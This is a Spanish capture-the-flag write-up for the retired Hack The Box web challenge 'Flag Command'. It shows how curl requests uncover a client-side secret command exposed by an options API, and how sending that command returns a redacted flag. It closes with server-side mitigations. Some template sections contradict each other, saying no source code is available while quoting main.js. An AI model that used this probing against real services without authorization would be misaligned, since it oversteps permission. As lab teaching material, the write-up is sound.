---
challenge: Flag Command
type: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, api, javascript, information-disclosure, client-side]
---

# Flag Command — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

«Dimensional Escape Quest»: una terminal que parece un juego de aventuras, pero toda la lógica está en el cliente. Los tres ficheros JS (`commands.js`, `main.js`, `game.js`) revelan que existe una lista `availableOptions['secret']`, y la API `GET /api/options` devuelve el JSON completo con el comando secreto. Al enviarlo se recibe la flag.

## Enunciado y superficie

Terminal en el navegador con comandos (`start`, `help`, `clear`…). El juego siempre termina en derrota: ninguna combinación de opciones normales lleva a la victoria.

## Reconocimiento

- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

Se revisa el tráfico y el código:

```bash
curl -s http://<IP>:<puerto>/ | grep -o 'src="[^"]*"'
```

```text
/static/terminal/js/commands.js
/static/terminal/js/main.js
/static/terminal/js/game.js
```

En `main.js` está la comprobación clave:

```js
if (availableOptions[currentStep].includes(currentCommand) ||
    availableOptions['secret'].includes(currentCommand)) {
```

Ese `availableOptions['secret']` solo se rellena con la respuesta de la API:

```bash
curl -s http://<IP>:<puerto>/api/options
```

```json
{"commands": ["start","help","clear", {"secret": ["Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"]}]}
```

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

Se envía el comando secreto, que el servidor acepta como válido en el endpoint de monitorización:

```bash
curl -s -X POST http://<IP>:<puerto>/api/monitor \
  -H 'Content-Type: application/json' \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

```text
HTB{<flag>}
```

La flag también aparece en la respuesta de la petición `monitor` en la pestaña de red, que es donde se puede copiar.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Frase exacta**: tiene que ser idéntica, con la puntuación y las mayúsculas del JSON.
- **CORS**: si el POST falla desde fuera del navegador, hacerlo desde la consola del propio sitio.
- **Ficheros JS**: los nombres cambian entre despliegues; buscar `api/options` en todos.

- Un juego «cliente» que decide qué comandos acepta no es un juego: es lógica que se puede leer.
- Los listados de opciones «ocultas» en una API son funcionalidad no documentada, no un secreto.
- Mitigación: validar en el servidor contra una allowlist por estado del juego y no enviar metadatos innecesarios al cliente.

## Mitigaciones y detección

- Aplicar la corrección de la categoría: validación en servidor, versiones parcheadas y mínimo privilegio.
- Detección: revisar los logs de la aplicación y alertar de 4xx/5xx repetidos o entradas anómalas.
